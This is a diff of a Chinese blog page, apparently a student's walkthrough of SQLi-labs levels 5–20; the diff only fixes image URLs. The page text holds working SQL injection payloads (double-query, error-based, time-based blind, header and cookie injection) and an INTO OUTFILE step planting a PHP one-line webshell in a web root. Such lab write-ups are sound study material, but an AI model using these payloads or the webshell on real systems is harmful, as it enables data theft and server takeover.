@@ -162,7 +162,7 @@
 </nav>
 
     <div class="banner" id="banner" parallax=true
-         style="background: url('https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/sql_injection0.png') no-repeat center center;
+         style="background: url('https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/sql_injection0.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -281,7 +281,7 @@
 <hr>
 <h3 id="5-6"><a href="#5-6" class="headerlink" title="5~6"></a>5~6</h3><p> 输入的正常查询语句不再显示有用的信息，但报错语句仍有提示。此时根据题目类型“double injection”采用双查询注入的方法</p>
 <blockquote>
-<p><em>若SQL语句正确，则页面正常返回，但返回的页面中不包含任何有用的信息，而当SQL语句错误时，页面会显示SQL错误信息。在这种情况下，Double Injection是十分有用的。</em><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210529133753.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210529133753.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><em>若SQL语句正确，则页面正常返回，但返回的页面中不包含任何有用的信息，而当SQL语句错误时，页面会显示SQL错误信息。在这种情况下，Double Injection是十分有用的。</em><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210529133753.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210529133753.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
 <p> <em>———查询有关double injection的详细信息请点击这里<a target="_blank" rel="noopener" href="https://blog.werner.wiki/principle-of-double-injection-in-mysql/">Mysql中Double Injection原理浅析</a></em></p>
 </blockquote>
 <p>第一步完全一致，第二步不再用<code>select 1,2...</code>来观察回显，最多可用<code>order by</code>得到<code>union select</code> 的字段数。第三步中语句<code>union select...</code>后面拼接<code>concat((select...)</code>语句，两个select组成双查询。</p>
@@ -302,17 +302,17 @@
 <hr>
 <h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p> 这里使mysql语句闭合的方式为<code>?id=1&#39;))...%23</code>比之前略微复杂,而且还没有具体的语法报错内容，只能多次尝试（这也太不友好了…<a target="_blank" rel="noopener" href="https://blog.csdn.net/gou1791241251/article/details/111568910">点击查看这位老哥构造闭合语句的过程</a>）。同样页面不在显示有用的内容，只能看出语句是否正确，同5~6情况相似，最多可用<code>order by</code>得到<code>union select</code> 的字段数。但这关双注入的方式失效了，根据提示采用上传文件的方式。</p>
 <p><strong>ps：途中我遇到了怎么也上传不了文件的情况， <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1671259">这里</a>解释了原因，即需要先修改配置，赋予权限</strong>。可以看出这个漏洞的实现有较严格的条件限制。</p>
-<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210618162821.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210618162821.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618162821.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618162821.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
 <figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">...union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> into outfile<span class="hljs-string">&quot;C://hello.txt&quot;</span><br><span class="hljs-regexp">//</span>注意路径用“<span class="hljs-regexp">//</span>”,该语句执行结果如下，新生成了一个写有内容的hello文件。（好厉害直接就在C盘里塞东西）<br></code></pre></div></td></tr></table></figure>
 
-<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210606235322.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210606235322.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210606235322.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210606235322.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
 <p>将<code>hello.txt</code>改成一句话木马的php文件,因为这里的服务器是用PHP study搭建的，所以需要把该文件上传至<code>PHPTutorial\WWW</code>目录下（不同版本的phpstudy路径可能不同，而至于实际渗透环境中，这个目录就需要靠方法找了，这里暂时提供一个<a target="_blank" rel="noopener" href="https://blog.csdn.net/YQavenger/article/details/108967912">别人的方法-来自csdn</a>），再使用菜刀或蚁剑链接就可以了。</p>
 <figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">...?id=-<span class="hljs-number">1</span><span class="hljs-string">&#x27;))union select &quot;hello world!&quot;,&#x27;</span><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;,&quot;hacked!&quot; into outfile &quot;E:\\PHPTutorial\\WWW\\a.php&quot; %23</span><br><span class="hljs-string">//select 的值会写进文件中，若想写入字符串字符串需要用单引号或双引号闭合</span><br></code></pre></div></td></tr></table></figure>
 
-<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210618230901.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210618230901.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618230901.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618230901.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
 <p><em>尝试链接时，最开始我用的菜刀，过了一天就报毒，然后被系统自己删了；然后换了蚁剑，结果连不上，之前连dvwa时也是链接不上，但我都能直接访问….用蚁剑就连起了几个在线靶场的环境。我认为应该就是蚁剑出了问题，可这俩玩意我都是从github上官方下的…这阵子比较忙以后再弄工具</em></p>
-<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210618231315.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210618231315.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
-<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210618231725.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210618231725.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618231315.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618231315.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618231725.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618231725.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
 <p>（正常的话应该会显示绿色的对话框提示链接成功的）</p>
 <p>因为是直接上传了木马，链接成功的话就能直接控制服务器了。sql注入这个文件上传的漏洞威胁显然是很大的，我感觉以后遇到的情况会很少。</p>
 <hr>
@@ -337,7 +337,7 @@
 <p>这个脚本比较low，但具备了完成该任务的基本功能，要完成其他注入则需要升级。</p>
 <p>payload:查找security.users中的password</p>
 <p>对应运行结果</p>
-<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210620213416.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210620213416.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620213416.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620213416.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
 <p>9、10关：</p>
 <p> 因为无论传什么参数结果界面都完全不变，视觉上没有任何信息。所以采用基于时间的盲注方法。</p>
 </li>
@@ -351,13 +351,13 @@
 <p>…可能只有什么大佬才能纯手注完成吧…</p>
 <p>估计大佬也不会用手注这种方式来完成…</p>
 <p>最后贴上用脚本的截图</p>
-<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210620224800.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210620224800.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620224800.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620224800.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
 <hr>
 <h3 id="11-12"><a href="#11-12" class="headerlink" title="11~12"></a>11~12</h3><p> 从这里开始由get类型的注入转变为post类型的注入。之前都是可以直接在浏览器地址栏进行的get类型的注入，而通常post传送的数据不能在url上看到，只能通过抓包工具(burpsuite)，浏览器插件（hackbar）进行查看。无论我们在他给出的登录框怎么输入，上面的url地址栏都不会产生变化。</p>
-<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/0[%7DF[P%7BHGS9$L%60ZUP9G8S8B.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/0%5B%7DF%5BP%7BHGS9$L%60ZUP9G8S8B.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/0[%7DF[P%7BHGS9$L%60ZUP9G8S8B.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/0%5B%7DF%5BP%7BHGS9$L%60ZUP9G8S8B.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
 <p>而在登录框中构造的语句仍然是有效的，因为我们输入的就是post所上传的数据。</p>
 <p>当我在username栏末尾输入‘时报错。从这个报错语句中即可以看出这里的sql语句是以单引号闭合的。</p>
-<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210712214452.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210712214452.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210712214452.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210712214452.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
 <p>这里的username和password都是注入点，任选一个都可以使用语句注入。</p>
 <ul>
 <li>输入单双引号，观察报错信息，构造命令使语句闭合</li>
@@ -373,7 +373,7 @@
 <figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">1&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a #<br></code></pre></div></td></tr></table></figure>
 
 <p>对应结果</p>
-<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/jhgfhj.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/jhgfhj.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/jhgfhj.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/jhgfhj.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
 <p>而第14关就是语句的闭合方式变为双引号，可按照同样的方式进行注入。</p>
 <hr>
 <h3 id="15-16"><a href="#15-16" class="headerlink" title="15~16"></a>15~16</h3><p> 这两关是post类型的盲注。有了之前get类型中盲注的经验，这两关也就不那么复杂了。</p>
@@ -386,18 +386,18 @@
 <p>有点奇怪为什么账号和密码用的是y来隔开，依照我用的语句应该是~隔开才对</p>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">payload = <span class="hljs-string">&#x27;&#x27;&#x27;admin&quot;)and if(substr((select group_concat(concat_ws(&#x27;~&#x27;,password,username)) from security.users),&#123;&#125;,1)=&#123;&#125;,sleep(3),1)#&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(i), <span class="hljs-built_in">ascii</span>(j))<br></code></pre></div></td></tr></table></figure>
 
-<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210725152947.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210725152947.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210725152947.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210725152947.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
 <hr>
 <h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><p><em>历时很久做到了这里，我越发觉得需要多看看php，这样看看源码应该会对闯关有很大的帮助，不然每道题都是百度谷歌必应轮流转…于是乎我看了段时间的php…然而好像并没有什么明显的帮助，网站能用到函数太多了0.0..遇到了再去了解吧…</em></p>
 <p>这道题有提示说是password reset，通过尝试登录可以发现这关会检测你输入的用户名，当用户名错误的时候会友好提示并鼓励你😤</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210910211641.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210910211641.png" srcset="/img/loading.gif" lazyload></p>
 <p>而用户名正确时会弹出不一样的界面：</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210910211808.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210910211808.png" srcset="/img/loading.gif" lazyload></p>
 <p>它会提示你密码已更新。（事实上是真的更新了，这也可能也是我无意间把这个网站的数据库中password搞没的条件..后面会提到）</p>
 <p>阅读源码可知注入点就在password处。</p>
 <p>（然而我看起来很吃力。。百度看别人的<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43399807/article/details/116276217"> sqlilabs第17关_wh1sper、的博客-CSDN博客_sqlilabs第17关</a>）</p>
 <p>然后在password处构造一些基本的sql注入语句，都失败了。如图所示order by字段数都查不了。</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210910213407.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210910213407.png" srcset="/img/loading.gif" lazyload></p>
 <p>于是在这里又需要掌握一种新的方法——报错注入</p>
 <p>（其实第5、6关也能用报错注入，在有报错语句提示的时候也许就能用上的方法）</p>
 <p>报错注入可分别使用以下两种函数 ：</p>
@@ -413,29 +413,29 @@
 <p>**<code>extractvalue(1,concat(0x7e,(payload),0x7e))#</code>**这一种形式就好了)</p>
 <figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-comment">//查询当前数据库</span><br>passwd=<span class="hljs-number">1&#x27;</span><span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(database(</span>))))#</span><br><span class="hljs-function"><span class="hljs-comment">//查询所有的数据库名</span></span><br><span class="hljs-function">passwd</span>=<span class="hljs-number">1&#x27;</span><span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),1)#</span><br><span class="hljs-function"><span class="hljs-comment">//查user下的表名</span></span><br><span class="hljs-function">passwd</span>=<span class="hljs-number">1&#x27;</span><span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))<span class="hljs-meta">#</span><br></code></pre></div></td></tr></table></figure>
 
-<p><img src="C:\Users\26939\AppData\Roaming\Typora\typora-user-images\image-20210910222943565.png" srcset="/img/loading.gif" lazyload alt="image-20210910222943565"></p>
-<p> <img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210910222833.png" srcset="/img/loading.gif" lazyload></p>
-<p>值得注意的是，这关不让直接查user表，当sql语句为    <code> and extractvalue(1,concat(0x7e,(select group_concat(username) from security.users),0x7e))#</code>会弹出如下结果：<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210911105416.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/image-20210910222943565.png" srcset="/img/loading.gif" lazyload></p>
+<p> <img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210910222833.png" srcset="/img/loading.gif" lazyload></p>
+<p>值得注意的是，这关不让直接查user表，当sql语句为    <code> and extractvalue(1,concat(0x7e,(select group_concat(username) from security.users),0x7e))#</code>会弹出如下结果：<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911105416.png" srcset="/img/loading.gif" lazyload></p>
 <p>所以需要换个名字绕过</p>
 <p><code>and extractvalue(1,concat(0x7e,(select username from (select username from users)a limit 0,1),0x7e))</code></p>
 <p>另外我发现我数据库中好像所有的password都没了，像是这样。。。</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210911154244.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911154244.png" srcset="/img/loading.gif" lazyload></p>
 <hr>
 <h3 id="18-20"><a href="#18-20" class="headerlink" title="18~20"></a>18~20</h3><p>通过提示并查看源码可知第18关的注入点不在username和password上了，而在数据包的User-Agent处。</p>
 <p>通过尝试构造sql注入语句发现有报错信息，所以继续采取报错注入</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210911152728.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911152728.png" srcset="/img/loading.gif" lazyload></p>
 <p><code>User-Agent: 1&#39;and extractvalue(1,concat(0x7e,(database()),0x7e)) and &#39;1&#39;=&#39;1</code></p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210911152654.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911152654.png" srcset="/img/loading.gif" lazyload></p>
 <p>成功查询到当前数据库名。</p>
 <p>另外这里的语句末尾并不是用注释符#闭合，而是’1‘=’1来闭合。</p>
 <p>剩下的步骤就是利用报错注入，不再重复。</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210911153419.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911153419.png" srcset="/img/loading.gif" lazyload></p>
 <p>而第19关就从ua变成了Referer</p>
 <p><code>Referer: &#39;and extractvalue(1,concat(0x7e,(database()),0x7e))  and&#39;1&#39;=&#39;1</code></p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210911154938.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911154938.png" srcset="/img/loading.gif" lazyload></p>
 <p>不再赘述。</p>
 <p>20关是在cooki处</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210911155830.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911155830.png" srcset="/img/loading.gif" lazyload></p>
 <hr>
 <h3 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h3><hr>
 <ul>
@@ -450,7 +450,7 @@
 <p><em>小插曲：我就在这里写了个一句话木马（虽然在这里并不起作用），win10 的defender还是检测到了并弹出了危险警告。真是苦了defender能在我写的一堆垃圾中还找到疑似会伤害我的东西🤣</em></p>
 </li>
 </ul>
-<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/1DAFD32562C47EE4EB5BDD578D1CA7F0.jpg"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/1DAFD32562C47EE4EB5BDD578D1CA7F0.jpg" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/1DAFD32562C47EE4EB5BDD578D1CA7F0.jpg"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/1DAFD32562C47EE4EB5BDD578D1CA7F0.jpg" srcset="/img/loading.gif" lazyload alt="img"></a></p>
 <p>不过这防火墙是真烦人，打开文件就报毒，搞得我都误删了一次。心痛得我连夜把博客加进defender白名单。</p>
 <ul>
 <li><p>8 GET - Blind - Boolian Based 类型 掌握一些截取字符的函数，并要学会写py脚本解决。</p>
